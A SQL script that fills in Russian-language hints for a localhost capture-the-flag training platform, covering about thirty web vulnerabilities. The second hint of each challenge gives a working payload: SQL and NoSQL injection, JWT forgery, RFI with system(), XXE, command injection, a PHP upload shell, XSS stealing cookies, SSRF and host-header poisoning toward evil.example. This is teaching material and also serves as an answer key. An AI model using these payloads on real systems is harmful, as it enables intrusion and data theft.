UPDATE academy.challenges
SET hint_1 = $h$JWT — это токен из трёх частей: header.payload.signature. Если сервер не проверяет подпись, в header можно поставить alg=none (подпись отключается, и данные токена меняются руками).$h$,
    hint_2 = $h$Возьми access_token из ответа POST http://localhost:4000/api/auth/login или из Local Storage (ключ mv_token). Вставь токен на jwt.io, поменяй header на {"alg":"none","typ":"JWT"}, в payload поставь "role":"admin". Отправь GET http://localhost:4000/api/auth/me с заголовком Authorization: Bearer <токен>. Флаг в поле flag.$h$
WHERE slug = 'jwt-alg-none';

UPDATE academy.challenges
SET hint_1 = $h$Токен подписан алгоритмом HS256. Секрет подписи слабый — это как короткий пароль, который можно подобрать словарём.$h$,
    hint_2 = $h$Возьми access_token из POST http://localhost:4000/api/auth/login. Подбери секрет офлайн: hashcat -m 16500 token.txt rockyou.txt или jwt_tool <token> -C -d wordlist. Затем подпиши свой payload с role=admin тем же секретом и отправь GET http://localhost:4000/api/auth/me.$h$
WHERE slug = 'jwt-weak-secret';

UPDATE academy.challenges
SET hint_1 = $h$Логин собирает SQL-запрос склейкой строк. Символ ' закрывает строку запроса, а -- комментирует остаток (можно войти без пароля).$h$,
    hint_2 = $h$Открой http://localhost:3000/login или отправь POST http://localhost:4000/api/auth/login. В поле username введи admin'-- , пароль любой. Флаг вернётся в JSON-поле flag.$h$
WHERE slug = 'sqli-auth-bypass';

UPDATE academy.challenges
SET hint_1 = $h$Сервер сам решает, какие поля профиля сохранять. Если список не ограничен, можно прислать лишнее поле role (оно запишется как есть).$h$,
    hint_2 = $h$Войди как student и получи access_token. Затем PATCH http://localhost:4000/api/auth/profile с заголовком Authorization: Bearer <токен> и JSON {"role":"admin"}. Флаг в поле flag ответа.$h$
WHERE slug = 'mass-assignment-role';

UPDATE academy.challenges
SET hint_1 = $h$У формы входа нет ограничения попыток (сервер не блокирует после серии неверных паролей), а пароль admin — словарное слово.$h$,
    hint_2 = $h$Отправляй POST http://localhost:4000/api/auth/login с username=admin и разными password (rockyou.txt, ffuf или hydra). После 20 неудач подряд правильный пароль вернёт флаг в массиве flags.$h$
WHERE slug = 'brute-force-login';

UPDATE academy.challenges
SET hint_1 = $h$Параметр next задаёт, куда перекинуть после входа. Адрес не проверяется — можно увести пользователя на чужой сайт.$h$,
    hint_2 = $h$Открой в браузере или выполни curl -i http://localhost:4000/api/auth/login?next=//evil.example . Флаг лежит в заголовке ответа X-Challenge-Flag.$h$
WHERE slug = 'open-redirect-login';

UPDATE academy.challenges
SET hint_1 = $h$Ссылка для сброса пароля собирается из заголовка Host, которому сервер доверяет — домен в ссылке можно подменить.$h$,
    hint_2 = $h$POST http://localhost:4000/api/auth/forgot-password , JSON {"email":"student@academy.local"} и заголовок Host: evil.example . Письмо смотри: GET http://localhost:4000/api/auth/mailbox?email=student@academy.local — ссылка будет на evil.example. Затем POST /api/auth/reset с token из ссылки; флаг в поле flag.$h$
WHERE slug = 'password-reset-poisoning';

UPDATE academy.challenges
SET hint_1 = $h$GraphQL умеет описывать саму себя: интроспекция показывает все типы, поля и скрытые запросы схемы.$h$,
    hint_2 = $h$POST http://localhost:4000/graphql , JSON {"query":"{ __schema { types { name fields { name } } } }"}. Найди запрос systemDiagnostics и вызови его: {"query":"{ systemDiagnostics { flag } }"}.$h$
WHERE slug = 'graphql-introspection';

UPDATE academy.challenges
SET hint_1 = $h$GraphQL принимает сразу массив запросов (batch — много операций в одном HTTP-запросе). Ограничений по количеству нет.$h$,
    hint_2 = $h$POST http://localhost:4000/graphql с JSON-массивом из 200 и более объектов {"query":"{ __typename }"}. Флаг придёт в extensions первого результата.$h$
WHERE slug = 'graphql-batching-dos';

UPDATE academy.challenges
SET hint_1 = $h$В JavaScript у объектов есть прототип — общая «база», откуда берутся поля. Ключ __proto__ меняет её для всего приложения.$h$,
    hint_2 = $h$POST http://localhost:4000/api/profile/merge с JSON {"__proto__":{"isAdmin":true}}. Затем GET http://localhost:4000/api/admin/summary — флаг в поле flag.$h$
WHERE slug = 'prototype-pollution';

UPDATE academy.challenges
SET hint_1 = $h$Сервер сам ходит по URL из параметра. Если адрес не проверяется, можно обратиться к внутренним сервисам, которые недоступны из браузера.$h$,
    hint_2 = $h$POST http://localhost:4000/api/images/parse с JSON {"imageUrl":"http://stats-service:8000/debug"}. Ответ содержит preview и поле flag.$h$
WHERE slug = 'ssrf-image-fetch';

UPDATE academy.challenges
SET hint_1 = $h$CORS разрешает другим сайтам читать ответы API. Если разрешён любой Origin и передаются cookies, чужой сайт прочитает данные пользователя.$h$,
    hint_2 = $h$Сначала POST http://localhost:4000/api/session/login (student/student123) и получи cookie connect.sid. Затем GET http://localhost:4000/api/admin/flag с этой cookie и заголовком Origin: https://evil.example . Флаг в поле flag, также проверь Access-Control-Allow-Origin.$h$
WHERE slug = 'cors-wildcard-credentials';

UPDATE academy.challenges
SET hint_1 = $h$IDOR — доступ к чужому объекту по его id: сервер находит заказ по номеру, но не проверяет владельца.$h$,
    hint_2 = $h$С Bearer-токеном student вызови POST http://localhost:4000/graphql : {"query":"{ order(id: 1) { id buyerId notes address flag } }"}. Флаг в поле flag.$h$
WHERE slug = 'graphql-idor';

UPDATE academy.challenges
SET hint_1 = $h$LFI — подстановка своего пути в include: страница подключает файл, который вы укажете, а не только разрешённые.$h$,
    hint_2 = $h$Открой http://localhost:3000/legacy/report.php?page=../../flags/lfi.txt (или http://localhost:4000/legacy/report.php?page=../../flags/lfi.txt). Файл с флагом лежит в /var/www/flags/lfi.txt.$h$
WHERE slug = 'legacy-lfi';

UPDATE academy.challenges
SET hint_1 = $h$RFI — подключение удалённого файла: include берёт не локальный файл, а URL и выполняет его как PHP-код.$h$,
    hint_2 = $h$GET http://localhost:3000/legacy/template.php?page=<URL-encoded> , где page равен data://text/plain,<?php system('cat /var/www/flags/rfi.txt');?> .$h$
WHERE slug = 'legacy-rfi';

UPDATE academy.challenges
SET hint_1 = $h$XXE — XML позволяет объявить внешнюю сущность (ENTITY), которая подставляет содержимое локального файла в ответ.$h$,
    hint_2 = $h$POST http://localhost:4000/legacy/import.php с Content-Type: application/xml и телом: <?xml version="1.0"?><!DOCTYPE i [<!ENTITY x SYSTEM "file:///var/www/flags/xxe.txt">]><i><note>&x;</note></i> . Флаг в ответе.$h$
WHERE slug = 'legacy-xxe';

UPDATE academy.challenges
SET hint_1 = $h$Command Injection — ввод попадает в системную команду (system), а символы ; или | запускают ещё одну команду.$h$,
    hint_2 = $h$Открой http://localhost:3000/legacy/ping.php?host=127.0.0.1;cat%20/var/www/flags/cmd.txt . Флаг выведется в ответе.$h$
WHERE slug = 'legacy-command-injection';

UPDATE academy.challenges
SET hint_1 = $h$PHP Object Injection — unserialize() собирает объект из строки. Можно указать класс и поля, а магический метод __destruct выполнит код.$h$,
    hint_2 = $h$Открой http://localhost:3000/legacy/dashboard.php с cookie prefs = O:9:"CacheFile":1:{s:4:"path";s:30:"/var/www/flags/unserialize.txt";} (значение cookie нужно URL-encode). Класс CacheFile читает файл в __destruct.$h$
WHERE slug = 'legacy-php-object-injection';

UPDATE academy.challenges
SET hint_1 = $h$Unrestricted File Upload — сервер сохраняет файл с любым расширением в папку, где исполняется PHP, поэтому загрузка превращается в запуск кода.$h$,
    hint_2 = $h$POST multipart file на http://localhost:4000/legacy/upload.php с файлом shell.php такого содержания: <?php echo file_get_contents('/var/www/flags/upload.txt'); ?>. Затем открой /legacy/uploads/shell.php.$h$
WHERE slug = 'legacy-upload-php';

UPDATE academy.challenges
SET hint_1 = $h$IDOR — заказ по id без проверки владельца: API не сравнивает user_id заказа с текущим пользователем.$h$,
    hint_2 = $h$С Bearer-токеном student: GET http://localhost:4000/api/inventory/orders/1 . Если заказ чужой, в JSON будет поле flag.$h$
WHERE slug = 'inventory-idor';

UPDATE academy.challenges
SET hint_1 = $h$Race Condition — проверка баланса и списание не атомарны: несколько запросов читают баланс одновременно, до записи.$h$,
    hint_2 = $h$С Bearer-токеном student параллельно 20–30 раз: POST http://localhost:4000/api/inventory/redeem с JSON {"amount":1000} (например через xargs -P30). Когда баланс уйдёт в минус, ответ содержит flag.$h$
WHERE slug = 'inventory-race-condition';

UPDATE academy.challenges
SET hint_1 = $h$Path traversal — ../ выходит из каталога файлов: сервер читает файл по пути, не проверяя границы папки.$h$,
    hint_2 = $h$GET http://localhost:4000/api/inventory/files?name=../../../../var/www/flags/inventory.txt .$h$
WHERE slug = 'inventory-path-traversal';

UPDATE academy.challenges
SET hint_1 = $h$NoSQL Injection — в MongoDB вместо строки можно передать объект-оператор ($ne = «не равно»), и условие логина станет всегда истинным.$h$,
    hint_2 = $h$POST http://localhost:4000/api/partner/login с JSON {"username":{"$ne":null},"password":{"$ne":null}} . Флаг в поле flag.$h$
WHERE slug = 'nosql-auth-bypass';

UPDATE academy.challenges
SET hint_1 = $h$Слепая NoSQL-инъекция — данные не показываются, но разное поведение (успех/ошибка) позволяет угадывать пароль по символам, как оракул.$h$,
    hint_2 = $h$POST http://localhost:4000/api/partner/login с JSON {"username":"admin","password":{"$regex":"^V"}} , увеличивая префикс по одному символу. Полное совпадение вернёт flag.$h$
WHERE slug = 'nosql-blind';

UPDATE academy.challenges
SET hint_1 = $h$DOM XSS — данные из URL вставляются в HTML без экранирования, поэтому браузер выполняет теги script и onerror.$h$,
    hint_2 = $h$Открой http://localhost:3000/search?q=<img src=x onerror=alert(document.cookie)> . Флаг лежит в cookie dom_xss_flag (path /search) — виден в alert или Application → Cookies.$h$
WHERE slug = 'dom-xss';

UPDATE academy.challenges
SET hint_1 = $h$CSRF — браузер сам прикладывает cookie сессии к запросу, даже если он отправлен с чужого сайта, а токена подтверждения нет.$h$,
    hint_2 = $h$Эндпоинт POST http://localhost:4000/api/profile/email (нужна cookie connect.sid от POST /api/session/login). Отправь его с заголовком Origin: https://evil.example — флаг в поле flag.$h$
WHERE slug = 'csrf-profile-change';

UPDATE academy.challenges
SET hint_1 = $h$Clickjacking — страница не запрещает показ внутри iframe, её можно невидимо наложить и заставить нажать нужную кнопку.$h$,
    hint_2 = $h$Встрой http://localhost:3000/checkout в <iframe> и нажми «Подтвердить заказ». Если страница внутри фрейма (framed=true), ответ вернёт flag.$h$
WHERE slug = 'clickjacking-checkout';

UPDATE academy.challenges
SET hint_1 = $h$postMessage XSS — обработчик сообщений вставляет data в HTML без проверки отправителя (event.origin), поэтому чужой iframe может выполнить код.$h$,
    hint_2 = $h$Открой http://localhost:3000/support, затем во внешнем iframe вызови frames[0].postMessage('<img src=x onerror=alert(document.cookie)>','*'). Флаг в cookie pm_xss_flag (path /support).$h$
WHERE slug = 'postmessage-xss';

UPDATE academy.challenges
SET hint_1 = $h$Session Fixation — сервер принимает id сессии из внешнего параметра и не меняет его после входа, поэтому атакующий заранее знает id жертвы.$h$,
    hint_2 = $h$GET http://localhost:4000/api/auth/session?sid=hello123 (получишь cookie sid=hello123). Затем POST http://localhost:4000/api/auth/login (student/student123) с этой cookie. Потом GET http://localhost:4000/api/auth/session — флаг в поле flag.$h$
WHERE slug = 'session-fixation';

UPDATE academy.challenges
SET hint_1 = $h$Cache Poisoning — кэш хранит ответ по ключу без учёта заголовка, но тело зависит от X-Forwarded-Host, поэтому в кэш попадает подменённая ссылка.$h$,
    hint_2 = $h$GET http://localhost:4000/api/landing с заголовком X-Forwarded-Host: evil.example . Затем GET http://localhost:4000/api/landing без заголовка — в HTML будет комментарий с флагом.$h$
WHERE slug = 'cache-poisoning';